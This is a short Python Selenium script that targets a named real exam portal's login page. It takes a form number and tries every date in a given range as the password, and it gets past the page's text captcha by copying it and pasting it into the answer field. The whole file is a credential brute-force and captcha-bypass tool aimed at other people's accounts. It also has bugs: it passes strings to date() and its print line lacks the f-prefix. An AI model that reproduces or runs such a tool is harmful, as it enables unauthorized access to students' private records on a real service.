from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from datetime import date, timedelta



formno = input('Form no.')
path = input('path of chromedriver.exe: ')
sdate = input('Start date (DD MM YYYY)').split(' ')
edate = input('End date (DD MM YYYY)').split(' ')
sdate = date(sdate[2],sdate[1],sdate[0])   # start date
edate = date(edate[2],edate[1],edate[0])   # end date28082004
print('\n\n\n csat tool will try all dates(including) from {sdate[2]}/{sdate[1]}/{sdate[0]} to {edate[2]}/{edate[1]}/{edate[0]}')

print('wait for code to get an error and the password will be the last or 2nd last date to get error')
def daterange(date1, date2):
    for n in range(int ((date2 - date1).days)+1):
        yield date1 + timedelta(n)

dates=[]

for dt in daterange(sdate, edate):
    dates.append(dt.strftime("%d%m%Y"))

#print(dates)
dates.reverse()
print(dates)
url = "https://csat.allen.ac.in/#"
ser = Service(path)
driver = webdriver.Chrome(service=ser)
driver.get(url)
for date in dates:

    inputElement = driver.find_element_by_id("email")
    inputElement.send_keys(formno)
    inputElement = driver.find_element_by_id("password")
    inputElement.send_keys(str(date))

    element = driver.find_element_by_id('mainCaptcha')
    element.click()

    a = ActionChains(driver)
    # perform the ctrl+c pressing action
    a.key_down(Keys.CONTROL).send_keys('A').key_up(Keys.CONTROL).perform()
    a.key_down(Keys.CONTROL).send_keys('C').key_up(Keys.CONTROL).perform()

    element = driver.find_element_by_id('txtInput')
    element.click()
    a.key_down(Keys.CONTROL).send_keys('V').key_up(Keys.CONTROL).perform()

    driver.find_element_by_id('txtInput').send_keys(Keys.ENTER)
    print(date)